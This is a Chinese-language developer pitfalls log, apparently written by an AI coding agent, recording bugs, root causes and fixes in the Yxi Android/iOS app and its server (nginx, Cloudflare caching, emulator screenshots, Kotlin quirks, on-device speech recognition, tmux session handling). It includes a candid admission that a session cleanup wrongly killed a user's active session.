**根因**：`/etc/nginx/snippets/yxi-dl.conf` 最后一条是 `location / { return 404; }`。
这是当初有意为之的——下载站只放行首页、`/Yxi.apk`、`/latest.json` 和老 token 路径，
**其余全部拒绝**，免得整个目录被人扒。于是任何新加的静态资源目录都得**显式开口子**。

**修法**：在那条兜底 404 **之前**加一段
`location /shots/ { add_header Cache-Control "public, max-age=86400" always; }`，
`nginx -t` 过了再 `systemctl reload nginx`。
**怎么避开**：往这个站加任何新路径（图片、字体、`/press/`……）之前，先看一眼那份 snippet 的最后一行。

## #163 Cloudflare 把 **404 也缓 4 小时** —— 修好源站也白搭，换文件名才是解

**症状**：#162 修完、`nginx -t` 过了、`reload` 了，直连源站 `127.0.0.1:8899` 拿得到 200，
但公网上 `board-state.webp` 还是 404 —— **而同目录另外三张已经好了**。

**根因**：修配置之前我对这个 URL 试过好几次（另外三张只试了一次），
Cloudflare 把那个 404 响应缓了下来：`cf-cache-status: HIT`、`age: 158`、
`cache-control: max-age=14400`。**跟 #148 的 APK 是同一个 4 小时默认值** ——
原来它不只缓成功的响应，失败的也缓。

**修法**：没去翻 Cloudflare 的 API token，直接把文件从 `board-state.webp` 改名成 `board.webp`
（HTML 里同步改）。新 URL 结构上不可能命中旧缓存，一次就好。
**怎么避开**：**先把 nginx 配好再去请求那个 URL。** 在源站还会 404 的时候反复 curl 公网地址，
等于亲手把 404 种进 CDN。真要清，要么带 `?v=<时间戳>` 验证，要么换文件名。

## #164 在这台机器上用模拟器截图 —— 能拍，但要绕开 ANR

**症状**：Android 模拟器跑起来了、App 也连上了演示账号，但每次 `screencap` 都被
`System UI isn't responding` / `Yxi isn't responding` 的弹框盖住并且整屏变暗。
点 "Wait" 没反应，`input keyevent 4` 也没反应。

**根因**：这台机器 **CPU steal 47%~57%**（`vmstat` 的 `st` 列，宿主机严重超卖）。
模拟器实际只拿到不到一半算力，App 主线程在启动时（BouncyCastle DRBG 初始化 + SSH 连接）
超过 Android 5 秒的 ANR 线。**弹框一旦出现就再也点不掉** —— 因为输入分发本身也卡住了。

**修法**（实测能稳定出干净图）：
1. `-no-window`（有窗口会因为没 X11 直接起不来）+ `-gpu swiftshader_indirect`
   （`-gpu guest` 也能渲染但更慢）+ `-accel on`（`/dev/kvm` 可用）。
2. `settings put global hide_error_dialogs 0` —— **设成 1 反而更糟**：
   系统不弹框，改成直接把 App 杀掉，连启动都启不完。
3. **启动之后不要碰它。** ANR 是「输入分发超时」触发的，不点就不弹。
   `am start` 之后干等 75~90 秒，再连拍几张，挑没弹框的那张。
4. 已经弹出来的框清不掉，只能 `adb reboot` 重开（约 4 分钟）。
5. 要切界面又不想点：**改 App 自己的 prefs**。
   `adb shell run-as app.yxi sh -c 'cat > shared_prefs/yxi.xml'` 写进
   `<string name="boardview:demo">group</string>`，重启 App 就直接落在分组视图。
   只有非拍不可的动作（长按主机看体检、点进会话）才发一次输入，发完立刻等。
6. 判断截图干不干净别靠眼睛：弹框是浅色的，取 (540,1150) 附近几个点，
   亮度 >150 就是有弹框 —— 写成脚本循环重拍，比人工翻图省事得多。

**怎么避开**：这不是模拟器的问题，是宿主机被邻居抢 CPU（见 #157）。
换台 steal 低的机器就没这些事；在这台上就按上面的节奏来。

## #165 「一键收拾」收的是**它自己** —— awk 把自己的程序正文认成了 Gradle 守护进程

**症状**：用户手机上体检面板显示「可以收拾 1 类 · 约 7 MB」。这台机器当时
交换用掉 72%、30 个会话占着 11 GB —— 7 MB 收了等于没收。

**根因**：`SCAN_COMMAND` 是 `ps -eo args= | awk '… if (line ~ /GradleDaemon/) …'`。
**`ps -eo args=` 会把这条 awk 自己列出来**，而它的命令行里明明白白写着 `GradleDaemon`
—— 于是它把自己（和外面那两层 `bash -c`）认成 Gradle 守护进程。
三个几 MB 的临时 shell，加起来正好 7 MB。**这个按钮从上线起就是空的。**

**修法**：给扫描命令埋一个只可能出现在它自身里的记号（`--yxiscan--`），
`if (line ~ /yxiscan/) next` 自排除。测试 `扫描命令不能把自己算进去()` 钉住这个记号。
**怎么避开**：任何「用 `ps` 找进程再按命令行匹配」的脚本都有这个坑 ——
**匹配模式写在命令行里，命令行又会被 `ps` 列出来**。先想清楚怎么排除自己。

## #166 我按 tmux 的活动时间清理会话，杀掉了用户正在用的那个

**症状**：用户报「hexingyang 那个 agent 我终端发送好像没有成功发送过去」。

**根因**：我按 `tmux list-sessions` 的 `#{session_activity}` 判「闲置 ≥3 天」批量清理，
`cc-hexingyang` 显示闲了 3.9 天，被我杀了；8 分钟后 `cloud-watchdog` 把它 `--resume` 拉回来。
那 8 分钟里用户从终端发的话，发进了一个不存在的会话。

**而 `session_activity` 在没人 attach 时根本不更新** —— 这条坑
`SessionProbe.lastActivityOf` 的注释里**是我自己写下的**（「cc-claude_desktop 的 tmux 活动
写着 2 天前，而它的转录一分钟前还在写」），清理时又踩了一遍。
实测那一刻：tmux 说闲了 3.9 天，转录 15 分钟前还在写。

**修法**：
- 手上那次：认错、说清时间线。对话存档没丢（`claude --resume` 能接回来）。
- 代码里：App 新加的「闲置会话」一类改成
  `max(tmux 活动, 转录 mtime)`，转录**按 sessionId 找**（`~/.claude/sessions/` 下那些
  json 里有 `tmux` 和 `sessionId`，转录文件名就是 `<sessionId>.jsonl`）；
  Claude Code 自己报 busy / waiting 的一律跳过；**查不到就不列（fail-closed）**。
  验证：`cc-hexingyang` 从「闲置 3.9 天」变成「闲置 17 分钟」，awk 和独立写的 python 完全一致。

**怎么避开**：**判断「这个会话还活着吗」永远以转录 mtime 为准。**
tmux 那个时间戳只在有人 attach 时才可信。
⚠️ 还有一条：**光 `tmux kill-session` 在这套机器上没用** ——
`cloud-watchdog.timer` 每 15 秒把「登记过但没在跑」的会话拉回来。
要真收掉得走 `cloud-forget`（移出恢复名单 + 杀，**保留对话存档**）。

## #167 会话里 `cd` 过一次，对话页就永远显示「没找到转录」

**症状**：`cc-hexingyang` 的对话 tab 一直显示
「这个会话里没找到 Claude Code 的转录（/root/src/workspace/hexingyang/unitree_rl_mjlab-main）」，
而终端 tab 一切正常。

**根因**：App 拿 `pane_current_path` 推转录目录，**而 Claude Code 是按启动时那个目录
建目录的**。这个会话在 `/root/src/workspace/hexingyang` 启动、后来 cd 进了子目录：
转录在 `-root-src-workspace-hexingyang/`（4.3 MB，一直在写），
App 去翻的是 `-root-src-workspace-hexingyang-unitree-rl-mjlab-main/`（空目录，确实存在）。
⚠️ **`~/.claude/sessions/*.json` 里的 `cwd` 也不行** —— 它跟着 cd 走，跟 pane 一样会漂。

**修法**：按 **sessionId** 找。那份 json 里有 `tmux`（会话名）和 `sessionId`，
转录文件名就是 `<sessionId>.jsonl`，这条链不受 cd 影响。找不到才退回按目录找。
⚠️ **不往父目录爬**：`/a/b/c` 爬到 `/a/b` 很可能撞上另一个会话的转录，
**显示错人的对话比显示「没找到」糟得多**。
⚠️ 通配符只能一层（`*/<sid>.jsonl`）—— 递归会挑到 `<会话uuid>/subagents/` 里子 agent 那份。

## #168 `[Image: original 1264x2800, …]` 冒充用户说的话

**症状**：用户发图之后，对话里出现一个蓝色用户气泡，内容是
`[Image: original 1264x2800, displayed at 903x2000. Multiply coordinates by 1.40 to map to original image.]`。
用户：「我看终端里面分明没有显示」。

**根因**：Claude Code 把一批「role 是 user、但人没说过」的东西也写成 user 消息，
统一带 **`isMeta: true`**：读图后的坐标注解、Stop 钩子回执、目标复查、skill 载入说明……
App 没看这个标记，照直画成用户气泡 = **凭空替用户说话**。
一份真实转录里 91 条 isMeta，其中 62 条是图片注解。

**修法**：`parseUser` 收 `isMeta`，分三档：带 `<agent-message>` 之类标签的照旧走
`Injected`（那些**有内容**，比如别的会话发来的消息）；图片坐标注解**整条丢**；
其余画成「系统消息」。⚠️ 而且 isMeta 的文本**不能进 `said`** ——
那是排队消息的出队判据（#76），拿系统文本去配对会把用户真正排队的那条误判成「已经说过了」。

## #169 Kotlin 的块注释**会嵌套** —— 注释里写 `sessions/*.json` 把整个文件吃掉了

**症状**：给 `TranscriptStream.kt` 加了段 KDoc 之后，编译器报
`TranscriptStream.kt:17:26 Syntax error: Missing '}'` 和
`TranscriptStream.kt:93:1 Syntax error: Unclosed comment`，
而 17 行是 `object TranscriptStream {`、93 行是文件末尾。看起来像是括号不配对，其实不是。

**根因**：**Kotlin 的块注释是可以嵌套的**（跟 Java 不一样）。
我在 KDoc 里写了 `` `~/.claude/sessions/*.json` `` —— 那个 `/*` 开了一层**内层注释**，
KDoc 末尾的 `*/` 只关掉内层，外层一直开到文件结束。

**修法**：改写成 `` `~/.claude/sessions/` 下那些 json ``。
**怎么避开**：Kotlin 注释里出现 `/*` 就是炸弹，路径通配符（`dir/*.ext`）最容易撞上。
报错信息完全不指向真凶（它指的是第一个没闭合的 `{`），下次看到
「Unclosed comment 在文件最后一行」先去注释里找 `/*`。

## #170 冷启动 + 断线 = 一块空看板，看着像会话全没了

**症状**：用户「一进去就显示『连接断了，正在重连…』」，下面只剩「未启用 2」，
十几个会话一个不见。

**根因**：两件事叠一起。① 会话列表**只存在内存里**（`Recent` 当初刻意不落盘，
理由是「看到一屏几小时前的假状态比空着更误导」），安卓在后台把进程杀掉就没了；
② 用户手机在**三个出口 IP 之间跳**（40 分钟内 64.83.15.133 / 39.144.190.15 / 220.202.230.56，
同一把钥匙），每跳一次 TCP 就断一次，重连要好几秒。于是冷启动那几秒是纯空白。

**修法**：`Recent` 落盘（带时间戳，超过 24 小时不给），冷启动先把上次那份摆出来；
但**必须标明是旧的** —— 断线横幅上加「· N 分钟前的状态」，刷新成功才摘掉。
原来那条注释的顾虑是对的，所以不是「装作实时」而是「**旧但标明白**」。
**跟 #151 / #154 是同一条教训：宁可显示标了时间的旧数据，也别显示空白。**

## #171 一次选多张图，远端路径会**互相覆盖** —— 相册给的每张都叫 `image.png`

**症状**（改多选时提前发现的，不是线上事故）：iOS 那边远端路径是
`<目录>/<秒级时间戳>-<文件名>`，而 `PhotosPicker` 交出来的每一张
**文件名都是 `image.png`**。一次选三张、三个上传并发跑在同一秒里 ——
三个算出来是**同一个路径**，后写的覆盖先写的，附件条上少两张、**一个报错都没有**。

**根因**：路径的唯一性同时依赖「时间戳」和「文件名」，而多选时**两个都不唯一**。

**修法**：两头都收紧 —— 时间戳改成毫秒，文件名带批内序号（`image-1.png`）。
安卓那边本来就把 `idx` 传进 `Attachments.upload`，不受影响。
**怎么避开**：**「时间戳 + 原始文件名」不是唯一键。** 只要调用方可能并发、
或者来源会给重名（相册、扫描件、`IMG_0001`），就必须再掺一个批内递增的量。

## #172 一次传多个时，序号要么撞、要么错 —— 顺序传，别并发

**背景**：#156 修过一次「第一张没传完就点第二张，第二张必失败」。
现在支持一次选多个，同一个坑换了个入口回来：
`idx = staged.count { … } + 1` 读的是**当前** `staged`，而 `staged` 只在**上传成功后**才更新。
五个协程并发起跑，五个都读到同一份，算出来全是 1。

**修法**：安卓这边**一批里顺序传**（`for` 里 `await`），每轮都读得到上一轮的结果，
序号自然连得上。慢一点，但「图片1/2/3」编号对得上比省那几秒重要 ——
编号错了，那边的 Claude 就会去读错的文件。
⚠️ 另外**失败要攒起来一次报**：五张里坏三张就弹三个 Toast，后面的顶掉前面的，
用户只看见最后一条，等于没报。现在是「5 个里有 3 个没传上：<原因>」。

## #173 「点击拉起安装器没反应」—— 那个绿按钮是**状态**，不是按钮

**症状**：更新下好了，卡片上一个绿色的「拉起安装器」按钮，点下去**一点反应都没有**。

**根因（两层）**：
1. **那个按钮在成功态下根本不可点。** `MorphButton` 写的是
   `clickable(enabled = phase == Idle || phase == Fail)` —— 成功态是「做完了」的收尾，
   本来不该再点。**但它的文案写着「拉起安装器」，一个动词。**
   写成动词就一定会有人点，点了没反应就是 bug。
2. **那为什么第一次没自动弹出来？** 下载跑在 app scope 上（切页面不断，这是对的），
   28 MB 在手机网络下要几分钟 —— 下完那一刻用户多半已经切出去了。
   而 **Android 10 起后台不许起 Activity**：`startActivity` 不抛异常、不返回失败，
   **就是什么都不发生**。于是安装器从来没出现过，而按钮上写着「拉起安装器」还点不动。

**修法**：`MorphButton` 加 `okTap`，成功态**本身是个动作**时才打开；
`UpdateDownloader` 留住下好的文件（`ready`）并提供 `installNow()` ——
回到这一屏点一下就再拉一次（那时 App 在前台，一定拉得起来），**不用重下 28 MB**。
文案改成「已下好 · 点一下安装」。

**怎么避开**：两条通则 ——
① **收尾话术和可点状态必须一致：写成动词就得能点，不能点就别写成动词。**
② **后台起 Activity 会静默失败。** 任何「下载完自动打开点什么」的流程，
都必须留一条「回到前台再来一次」的路，而且**不能要求重做前面那步**。

## #174 同组 agent 互发消息，整段话躺在对方输入框里**没发出去**

**症状**（用户截图）：`cc-logto` 通过 `yxi-hub say` 发给同组的一段长消息，
在对方会话里**原样挂在 `❯` 后面**，一直没提交。单行消息一切正常。

**根因**：`push()` 是两条命令背靠背 ——
`tmux send-keys -l "$text"` 紧跟 `tmux send-keys Enter`。
**Claude Code 的输入框认「括号粘贴」**：一大块文本连着来，它按**粘贴**处理，
而粘贴块里的换行是**字面换行不是提交**；微秒之后到达的 Enter 被算进同一块，
于是整段话进了输入框却没提交。

⚠️ **单行不触发**（不够长，不当粘贴）—— 所以手测「你好」永远测不出来，
这个坑只在 agent 之间发长消息时露头。

**实测**：背靠背发 3 行 → 留在框里；中间 `sleep 0.4` → 正常提交（`Press up to edit queued messages`）。

**修法**：`server/yxi-hub` 的 `push()` 在两条 `send-keys` 之间 `sleep 0.4`。
⚠️ **手机端同一条路也改了**（`SessionProbe.send` / iOS `sendCommands`）：
它以前是两条 `exec`，靠**网络往返的偶然延迟**躲过去的 —— 链路快的时候一样会中招，
而**带附件的消息一定是多行**（头部路径 + 正文），多行在那条路上是常态不是特例。
现在合成一条 shell 命令、中间显式 `sleep`：**一个来回**（比原来还少一个），间隔是确定的。

**怎么避开**：**往 TUI 里灌文本，「送完立刻回车」是不可靠的。**
终端应用普遍有粘贴检测/输入去抖，判据是「一段时间内连着来的字节」——
要它按「用户敲了回车」处理，就得让回车**明显晚于**正文。

## #175 语音识别不准 —— 换成在**你自己的服务器上**跑，别去买云 API

**症状**：用户说「语音识别感觉不是很准确」，问能不能换成微信那个。

**先把事实说清楚**：
- **微信那套拿不到**。腾讯自研、**不开源**、也**没有给第三方的独立 SDK**。
- 能买到的是**腾讯云 ASR**，另一个产品，**要钱**（有免费额度）。
- 而且对 Yxi 有个结构性问题：**这个 App 没有后端**，云 API 的密钥只能塞进 APK 里 ——
  那等于把它公开。跟「不查 GitHub Release」是同一条理由。

**为什么原来不准**：走的是系统 `RecognizerIntent`。用户那台荣耀 **GMS 是关的**，
落到 ROM 自带的识别引擎上，质量不由我们控制，也没法针对「命令 / 路径 / 技术词」调。

**修法**：识别放到 App 本来就 SSH 连着的那台服务器上（`server/yxi-asr`）。
模型是 **SenseVoice-Small**（阿里 FunAudioLLM，**Apache-2.0，免费**），走 **sherpa-onnx**
的 ONNX 运行时 —— **不要 torch**，整套 357MB（venv 128MB + int8 模型 229MB）。
实测这台 16 核、被宿主机抢走三到五成 CPU 的机器上：

| | 结果 | 耗时 |
|---|---|---|
| 中文 | 开饭时间早上9点至下午5点。 | 3.7s |
| 粤语 | 呢几个字都表达唔到我想讲嘅意思。 | 2.0s |
| 英文 | The tribal chieftain called for the boy… | 3.8s |

自带标点和数字归一化。手机录 16k 单声道 m4a（10 秒约 24KB），传上去、识别、**立刻删**。

**三个踩到的点**：
- ⚠️ **必须常驻。** 装载模型 6~10 秒、解码只要 1.6 秒 —— 每次现装的话一条语音要等十几秒。
  守护走 unix socket，**闲置 10 分钟自己退**（常驻 330MB，不该在不用语音时一直占着）。
- ⚠️ **要预热。** 冷启动那 6~10 秒摊在「用户说完话之后」是最难受的位置。
  进对话页时调 `yxi-asr --warm`（fork 完立刻返回，0.15 秒），
  等用户真说完，模型早好了：**实测 9.0 秒 → 3.9 秒**。
- ⚠️ **默认不装。** 一个连自己服务器的工具，不该强迫用户先放 360MB 模型才能用麦克风。
  没装就退回系统识别，App 自己探（`yxi-asr --check`）。装：`server/install.sh --asr`。

## #176 Kotlin 的扩展函数**不能全限定调用**

**症状**：写 `androidx.compose.foundation.gestures.awaitEachGesture { … }`，
编译器报 `Unresolved reference 'awaitEachGesture'` —— 而 `DPad.kt` 里用同一个符号好好的。
更迷惑的是后面跟着一串莫名其妙的错（`inferred type is 'WideNavigationRailValue'`），
那是前一个没解析成功之后的连锁反应，跟真问题毫无关系。

**根因**：`awaitEachGesture` / `awaitFirstDown` 是 **`PointerInputScope` 的扩展函数**。
Kotlin 里**扩展函数必须 import 才能用短名调用，写全限定名是不行的** ——
全限定语法只对成员和顶层非扩展声明有效。`DPad.kt` 是 `import` 的，所以它没事。

**怎么避开**：加 import，用短名。看到「某个符号在别的文件里能用、在这儿全限定却说找不到」，
先看它是不是扩展函数。


## #177 「装了 App 就能用」这句话，三条路只有一条真做到

用户问「别的用户使用这个语音能不能直接用，这个语音的识别是直接放到 app 上的吗」，
又追问「之前的谷歌的语音识别难道不是语音的吗」「不是直接安装的所有人都可以用的吗」。
**他问得对，我前面的说法不够准确。** 三条路各自的真实边界：

| | 装了 App 就能用？ | 准不准 |
|---|---|---|
| **系统 `RecognizerIntent`**（最早那版） | 大多数带 GMS 的手机能；**GMS 关掉的一个识别器都没有**（#152） | **不由我们决定** |
| **服务端 `yxi-asr`**（0.9.54） | **不能** —— 要用户先在自己服务器上装 360MB | 准 |
| **手机上算**（0.9.55） | **能** | 准，而且离线 |

⚠️ **`RecognizerIntent` 自己不做识别**，它只是把活转交给手机上装着的识别器 App。
「它是系统 API 所以人人都有」是个错觉 —— 国行 ROM 关掉 GMS 之后
`pm query-activities` 是 0 个，那个按钮就是死的。

**手机上算是怎么做的**：sherpa-onnx 官方安卓 AAR + SenseVoice-Small（Apache-2.0）。
- **只打包 arm64-v8a**：AAR 带四套原生库共 120MB，全带上 APK 会到 150MB+。
  只留 arm64（2017 年后的安卓手机全是）→ APK **28MB → 49MB**。
  ⚠️ 代价：**模拟器（x86_64）上没有语音**，在模拟器上验会看到「这台设备不支持」，别以为代码坏了。
- **模型不进 APK**（解开 229MB）：首次用语音时下 153MB 的 tgz，落进 App 私有目录（卸载即净）。
  下载走 app scope（不挂界面，切页面不断）、带 sha256 校验、**解压只认白名单里那两个文件名**
  （从网上下的包，照着包里的路径写文件一个 `../../` 就能写出 App 目录 —— Zip Slip）。
- **录音改用 `AudioRecord` 出 16k PCM**，不再走 `MediaRecorder` 的 m4a：
  模型吃的就是 PCM，编一次再解一次纯属白绕。退回服务端那条路时才现拼个 wav 头（44 字节）。

## #178 源文件里混进了**真的 NUL 字节**

**症状**：写 tar 解析时要按 NUL 去空白（tar 的字段是 NUL 补齐的，不是空格）。
我用 Write 工具写文件时，本想写转义 `\u0000`，结果落进文件的是**一个实际的 NUL 字节**。
Kotlin **照样编过**，但那个字符在编辑器里看不见、`grep` 匹配不到、diff 出来是乱的 ——
后来想改这几行，python 里的字符串怎么都对不上，查了两轮才发现文件里真有三个。

**更好笑的后续**：我想把这条坑记进文档，命令里粘了那几个字符，
**Bash 工具直接拒绝执行**，理由是「command contains control characters that would be
hidden in the approval dialog」。工具比我先发现了这件事。

**修法**：`grep -naP '\x00' <文件>` 找出来，按字节替换成转义写法 `\u0000`。
**怎么避开**：往源文件里写控制字符，**永远写转义序列**，别让工具替你决定那是字面还是转义。
源码里出现 NUL 基本可以肯定是个意外 —— `grep -rlP '\x00' --include='*.kt' .` 扫一遍很便宜。


## #179 用户消息里的附件是一条路径，不是图

**症状**（用户截图）：发了一张图之后，气泡里是
`[图片1] /root/src/tmp/begirl/0902-091207-IMG_20260902_091201_037.jpg` ——
一条又长又没用的路径占掉四行，**而用户想看的是那张图**。
他的原话：「要像参考款一样出一个缩略图，这样就可以方便我们查看，不是只是一条路径」。

**根因**：`Attachments.header` 把 `[图片N] <远端路径>` 拼在正文前面发出去 ——
**那是给 agent 看的**（让它自己去 Read 那个文件，见 #52：不把 base64 塞进上下文）。
但渲染时没人把它摘出来，于是给 agent 看的东西原样显示给了人。

**修法**：`Attachments.parseRefs` 把开头那几行摘出来，`AttachThumb` 走 SFTP 把图拉回来画成
112dp 的缩略图，点开全屏看。剩下的正文正常显示；**只有附件没打字时不画空气泡**。

**四个必须注意的点**：
- ⚠️ **只认开头连续的那几行**。正文里完全可能出现同样长相的一句
  （用户在讲「[图片1] 是哪张」），一路扫到底会把正文也吃掉。
- ⚠️ **按扩展名判图片，不按标签判**。标签是本地化的（`图片1`/`Image 1`），
  按标签判的话换个语言看历史消息就全认不出来。
- ⚠️ **先按 `inSampleSize` 解码再缓存**。手机拍的原图直接进内存就是几十 MB 的 Bitmap，
  几张就 OOM；超过 8MB 的干脆不拉（显示文件名比把 App 拖死好）。
- ⚠️ **拉不到不是错误**。暂存区 3 天就清（`Attachments.sweep`），老消息里的图必然拉不到 ——
  那时候安静地显示文件名，**不画碎图标**，别让界面看起来像坏了。

## #180 「思考时的背景变化」——抄 参考款的观感，但让颜色带上信息

用户看着 参考款 那个绿色渐变说想要同款。直接抄一个绿色呼吸灯是能做，
但**我们比 参考款 多一件事可说**：这个会话是在干活还是在等你。

所以 `ThinkingGlow` 的颜色跟看板上那两个圆点**同一组色值**：
干活中 = 青 `#8FD8C6`，等你 = 琥珀 `#FFC46B`。
同一个色在这个 App 里始终是同一个意思，那它就不只是好看，而是扫一眼就知道现在什么情况。

三条约束：
- ⚠️ **淡到不抢内容**：顶部 alpha 0.16 起，两团光的半径远小于屏高，正文区天然干净。
- ⚠️ **淡入淡出不硬切**：状态每几百毫秒就可能翻一次，硬切会让屏幕一闪一闪，比没有还糟。
- ⚠️ **系统关了动画就不流动**，只留静止的一层。大面积色块持续缓慢移动，
  对前庭功能障碍的用户是持续刺激 —— 这是无障碍要求，不是体贴。


## #181 换 logo：一个**横向字样**做启动器图标，要按安全圆算尺寸

用户给了新 logo（`design/logo-yunxi.png`，921×921，浅灰底上的黑色毛笔字「Yunxi」），
要求直接换成 App 图标。

**两件必须算清楚的事**：
- **自适应图标的画布是 108dp，但只有中间 66dp 保证可见** —— 启动器按自家形状裁
  （圆、圆角方、水滴各家不同）。字样是横的（墨迹 564×349，比例 1.62），
  要塞进直径 66 的圆里，宽度得按 `w = d·r/√(1+r²) = 66·1.62/1.905 ≈ 56dp` 算 ——
  也就是**画布宽的 52%**。照 66/108 直接算成 61% 的话，两端会被圆形裁掉。
- **底色必须跟着 logo 走**。原来的底是深棕 `#241C14`（配旧的橙色前景），
  新墨迹是黑的 —— 不换底的话整个图标是一坨黑。取 logo 自带的浅灰 `#E9E9E9`。

⚠️ **通知栏图标没换**（`ic_stat_yxi.xml`）。状态栏图标是 24dp 的白色剪影，
「Yunxi」四个连笔字在那个尺寸上是一团糊 —— 字样 logo 在这个位置**物理上做不到**，
留着原来那个抽象标记是对的。

## #182 默认风格改成浅色：三个地方要一起改，不然会「先黑一下再变白」

用户：「界面风格以后默认就是浅色，别叫 参考款 浅色了，新用户刚进来看见的就是浅色」。

- **默认值**：`Skin.style` 初值改成 `Light`。⚠️ 只影响**没选过**的人 ——
  `load()` 读到存过的值就照存的来，换默认不该把老用户已经选好的掀掉。
- **名字**：`"浅色（参考款）"` → `"浅色"`。⚠️ **`key` 保持 `参考款` 不动** ——
  那是存在用户手机里的值，改了等于把所有选过浅色的人重置回深色。
  **名字给人看，key 是数据，两者不该绑在一起。**
  源码里的标识符 `参考款Palette` 也改成 `LightPalette`；
  注释里那句「照着 参考款手机版调的」留着，那是出处，该写。
- ⚠️ **启动窗口的底色（`themes.xml`）也得跟着换**。它原来是深色 `#16130F`，
  注释写着「避免冷启动闪白」—— 默认改浅之后，这句话正好反过来：
  留着深色底就是**先黑一下再变白**，正是这个 style 当初为了避免才存在的那种闪。
  顺带 `windowLightStatusBar=true`，否则白底上状态栏图标是白的、看不见。

⚠️ 还顺手修了个老坑：`Style.label` 是 **enum 构造参数**，
而 enum 常量的参数在类初始化时求值一次 —— 换语言这一栏不会跟着变。
改成 `get() = t(zh)`，跟 `SessionState.label` 一个写法（那个当初就是这么修的）。


## #183 「未启用 5」是在没数据的时候硬下的结论

**症状**（用户截图）：一进 App 看到「未启用 5」，anchor / begirl / logto / yxicrawl / 日常对话
全列在里面 —— **而它们明明都在跑**。用户：「其实是启动的，只是还没同步加载到」。

**根因**：那一栏的定义是 `faved.filter { it !in byName }` ——「收藏了、但不在当前会话表里」。
而会话表在还没同步到之前是**空的**，于是**每一个收藏都被算成没启动**。

⚠️ **比难看更糟的是它会骗人去点「唤起」**，而那个会话本来就在跑。
「未启用」是个**推论**，不是事实 —— 推论的前提（我知道现在有哪些会话）不成立时，
不该照样把结论摆出来。

**修法**：`val dormant = if (fresh) faved.filter { … } else emptyList()`。
没拿到真数据之前一条都不列 —— **不知道就说不知道**。
骨架的判据仍然是 `sessions.isEmpty() && !fresh`：
- `sessions.isEmpty()`：有缓存看板时（#170）该摆旧数据 + 标「N 分钟前」，盖个骨架是画蛇添足；
- `!fresh`：同步过、真的一个会话都没有，那是正常的空看板，不该一直转圈。
⚠️ 判据看的是 `sessions`（真会话表）不是「屏幕上有没有卡片」—— 假的「未启用」会把列表填满。

## #184 点消息里的缩略图，弹「授权可能已经失效」

**症状**：缩略图显示正常，**点开却报错**，而且报的原因是错的。

**根因**：放大预览只走本地那条路（`Staged.localUri` → `contentResolver`）。
那对「刚选好还没发」的图成立，但**已经发出去的**是从转录读回来的，只有远端路径、
`localUri` 是空的 —— 于是必然落进 else 分支。

**两个都得修**：
- 补上远端那条路：`localUri` 为空就走 SFTP 读（上限 12MB，比缩略图那 8MB 宽一点）。
- **话术也得分情况**。「授权可能已经失效」只对本地那条成立；
  已发出去的图拉不到，绝大多数是**暂存区 3 天清掉了**。
  说错原因比不说更糟 —— 用户会去翻权限设置，翻半天没有用。

## #185 「思考时的背景」第一版做成了单色，用户要的是多色

用户原话：「背景会是 参考款 一样是一个渐变的**各种浅色系**的内容渐变」。
我第一版按状态取一个色平铺（干活中=青，等你=琥珀）—— 语义是对的，
但**看着像一层滤镜，不像在呼吸**。

**修法**：三团光、三个邻近色相、各走各的相位（同相位的话它们会整体平移，
看着是一块色板在滑，而不是几团光互相错开地涨落）。
⚠️ **主色仍然带信息**：暖 = 等你拍板，冷 = 在干活，跟看板上那两个圆点同源。
配色只是把主色和它左右两个邻近色摆在一起，语义没被稀释 ——
**抄观感可以，别把自己已经有的信息层抄没了。**


## #186 「渐变没有流动的感觉」—— 几团光共用一个相位，等于一块色板在平移

**症状**：用户看了多色版渐变说「要有渐变流动的感觉，你可以直接去复刻 参考款」。
那一版四团光的位置都挂在**同一个** `t` 上（一个 7 秒的三角波）——
于是它们同进同退，整体效果就是一块色板缓慢左右挪，看不出「流」。

**修法**：三件事缺一不可 ——
- **每团各自一条独立动画**，周期**互不成整数倍**（7.3 / 9.1 / 11.7 / 13.9 秒）。
  成倍数的话它们会周期性回到同一个相对位置，几十秒就看出在循环。
- **x、y、半径分别挂在不同相位上**。只动 x 是平移；三样错开动才是「涨落」。
- `RepeatMode.Reverse` 不用 `Restart`：`Restart` 到头会瞬间跳回起点，
  那一下在大面积色块上像画面闪了一下。

**验证方法**：把 Kotlin 里的公式原样搬到 python 里画 0 / 2.5 / 5 / 7.5 / 10 秒五帧 ——
色块重心从左上到中到右、蓝绿比例逐帧在换，才算流动。**编译过不代表动得对。**

⚠️ 透明度从 0.17 提到 0.28（顶部那团）：照用户给的 参考款 截图估的，
它顶部是明显看得见的一层。第一版太怯，用户会说「没有」。

## #187 `/model` 菜单**只在会话启动时读一次** `availableModels`

**症状**：改 `~/.claude/settings.json` 里的 `availableModels`，在同一个会话里反复 `/model`，
得出一串互相矛盾的结论（「Fable 5.1 不存在」「Opus 4.6 没有 1M」「fable-5-1 单独能出、
一起就掉」）—— 全是错的。

**根因**：菜单在**会话启动时**读一次配置，之后不重读。我每次改完文件就在老会话里开菜单，
看到的一直是陈旧渲染；偶尔「变了」是因为中间某次 Escape 没关干净、`/model` 被打进了输入框。
**测量方法本身有问题，得出的每一条结论都不能要。**

**正确测法**：改完配置 → `tmux new-session` 开一个**全新的** `claude` → 等 `❯` 出现 → `/model`。
每测一次开一个新会话。

**摸出来的规则**（都是新会话里验的）：
- 写**别名**不写完整 id：`opus-4-6[1m]` 行，`claude-opus-4-6[1m]` 被丢掉；`fable-5-1[1m]` 行。
- 同一族里 `default` 之外**只留一个**：4.6 和 4.8 一起放只剩 4.8。
- `default` 就是账号默认（此刻 = Opus 5 · 1M），菜单第一项、打勾那个。
- 账号有没有某个模型，最可靠的判据是 `claude -p --model <id> 'reply ok'` 能不能回 ——
  API 认了菜单才可能出；API 认了菜单没出，那是菜单那层的问题。

⚠️ **settings.json 是被所有会话并发写的文件。** 读-改-写期间别的会话也在改
（`hooks` 加了 `PermissionRequest`、`effortLevel` 变了）—— 这次没撞上，
但这种改法本质上会覆盖并发写入。要频繁改它，得走 Claude Code 自己的命令，别直接写文件。


## #188 看板上滑动「终止」不是真终止 —— 十几秒后会话又回来了

**症状**（用户原话）：「现在的终止不是真的终止，终止了还在的」。滑动、确认、看着它消失，
过一会儿看板上又有它。

**根因**：`SessionProbe.kill` 是裸 `tmux kill-session`。而这台机器上
**`cloud-watchdog.timer` 每 15 秒把「登记过但没在跑」的会话 `claude --resume` 拉回来**。
#166 修体检面板「收拾闲置会话」时已经踩过一次、改成走 `cloud-forget` 了 ——
**同一件事的另一个入口（看板滑动终止）漏了**，两条路没收口到一处。

**修法**：`kill` 改成 `if command -v cloud-forget; then cloud-forget; else tmux kill-session; fi`，
跟 `Health.killCommand` 同一句。iOS 那边把命令搬进 `YxiKit.SessionProbe.killCommand`
